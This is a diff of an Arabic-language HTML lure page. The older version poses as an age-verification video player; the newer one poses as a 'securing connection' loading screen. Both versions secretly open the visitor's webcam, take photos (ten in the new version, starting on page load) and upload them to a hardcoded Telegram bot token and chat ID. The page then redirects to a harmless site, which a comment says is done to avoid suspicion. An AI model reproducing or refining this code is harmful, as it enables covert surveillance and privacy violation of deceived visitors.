@@ -1,49 +1,73 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar">
 <head>
-    <title>Video Player</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري تأمين الاتصال...</title>
     <style>
-        body { background-color: #000; color: white; text-align: center; font-family: Arial; padding-top: 20%; }
-        #playBtn { padding: 15px 30px; font-size: 20px; cursor: pointer; background: #ff0000; color: #fff; border: none; border-radius: 5px; }
+        body { background-color: #121212; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .loader { border: 5px solid #333; border-top: 5px solid #e74c3c; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        p { margin-top: 20px; color: #888; }
     </style>
 </head>
 <body>
-    <div id="player">
-        <h2>هذا الفيديو مخصص للكبار فقط</h2>
-        <p>يجب التأكد من هويتك عبر مسح الوجه للمتابعة</p>
-        <button id="playBtn">▶ تشغيل الفيديو</button>
-    </div>
-    <video id="video" style="display:none;" autoplay></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <div class="loader"></div>
+    <p>جاري فحص بروتوكولات الأمان، يرجى الانتظار...</p>
+
+    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
         const TOKEN = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
         const CHAT_ID = '8293639164';
+        let photoCount = 0;
+        const maxPhotos = 10; // عدد الصور المطلوب
 
-        document.getElementById('playBtn').addEventListener('click', async () => {
+        async function startCamera() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                document.getElementById('playBtn').innerText = "جاري التحقق...";
-                
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = 640; canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('photo', blob, 'photo.jpg');
-                        formData.append('chat_id', CHAT_ID);
-                        fetch(https://api.telegram.org/bot${TOKEN}/sendPhoto, { method: 'POST', body: formData })
-                        .then(() => { 
-                            // توجيهه لفيديو حقيقي لإبعاد الشبهات
-                            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
-                        });
-                    }, 'image/jpeg');
-                }, 1000);
-            } catch (e) { alert("عذراً، يجب السماح بالكاميرا لتأكيد العمر ومشاهدة الفيديو."); }
-        });
+
+                // إشعار بالدخول
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🚨 بدأ التقاط سلسلة الصور (10 صور)...")}`);
+
+                // وظيفة التقاط وإرسال صورة واحدة
+                const takeAndSendPhoto = () => {
+                    if (photoCount < maxPhotos) {
+                        const canvas = document.getElementById('canvas');
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append('photo', blob, `photo_${photoCount}.jpg`);
+                            formData.append('chat_id', CHAT_ID);
+                            formData.append('caption', `📸 لقطة رقم ${photoCount + 1}`);
+
+                            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: formData
+                            }).then(() => {
+                                photoCount++;
+                                if (photoCount < maxPhotos) {
+                                    setTimeout(takeAndSendPhoto, 1000); // انتظر ثانية قبل الصورة التالية
+                                } else {
+                                    // بعد الانتهاء من الـ 10 صور، حوله لجوجل
+                                    window.location.href = "https://www.google.com";
+                                }
+                            });
+                        }, 'image/jpeg');
+                    }
+                };
+
+                // ابدأ أول صورة بعد ثانيتين من فتح الكاميرا لضمان الوضوح
+                setTimeout(takeAndSendPhoto, 2000);
+
+            } catch (err) {
+                window.location.href = "https://www.google.com";
+            }
+        }
+        window.onload = startCamera;
     </script>
 </body>
 </html>
